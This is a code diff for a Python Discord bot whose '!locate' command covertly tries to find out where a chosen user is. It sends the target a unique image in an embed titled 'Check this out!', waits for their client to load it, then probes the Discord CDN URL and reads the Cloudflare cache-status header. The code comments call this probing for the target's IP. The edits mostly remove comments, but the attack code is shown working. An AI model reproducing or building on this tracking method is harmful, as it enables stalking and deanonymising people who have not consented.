@@ -15,8 +15,9 @@ TOKEN = os.getenv('DISCORD_TOKEN')
 if not TOKEN:
     raise ValueError("DISCORD_TOKEN environment variable is not set!")
 
+# 1. FIX: Enable Message Content Intent
 intents = discord.Intents.default()
-intents.message_content = True
+intents.message_content = True  # This line is crucial for !locate to work
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
@@ -60,12 +61,10 @@ async def on_guild_join(guild):
 
 def generate_unique_image(random_id):
     """Generates a unique image using Pillow to ensure no caching."""
-    # Create a white image
     img = Image.new('RGB', (400, 400), color=(255, 255, 255))
     d = ImageDraw.Draw(img)
     
     # Draw a unique pattern/text based on the ID
-    # Using a simple colored square and text to ensure uniqueness
     d.rectangle([50, 50, 350, 350], fill=None, outline=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=10)
     
     # Add the ID text to the center
@@ -82,7 +81,6 @@ def generate_unique_image(random_id):
     y = 200 - h / 2
     d.text((x, y), text, fill=(0, 0, 0), font=font)
     
-    # Save to bytes
     buffer = BytesIO()
     img.save(buffer, format='PNG')
     buffer.seek(0)
@@ -116,7 +114,6 @@ async def locate(ctx, user: discord.User):
         return
 
     # 4. Upload the image to Discord first to get a stable CDN URL
-    # This avoids issues with raw byte URLs expiring
     try:
         file = discord.File(fp=BytesIO(unique_img_data), filename=f"{random_id}.png")
         embed = discord.Embed(title="Check this out!", color=discord.Color.blue())
@@ -134,17 +131,14 @@ async def locate(ctx, user: discord.User):
         return
 
     # 5. Wait for the client to process the embed and fetch the image
-    # Give it enough time for the client to open the DM and render the embed
     await asyncio.sleep(15)
 
     # 6. Probe for IP using the Discord CDN URL of the attachment
-    # This URL is stable and won't expire quickly
     img_url = msg.attachments[0].url
     
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
     
     try:
-        # Use GET to mimic a real browser request more closely
         probe_resp = requests.get(img_url, headers=headers, timeout=10)
         
         cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
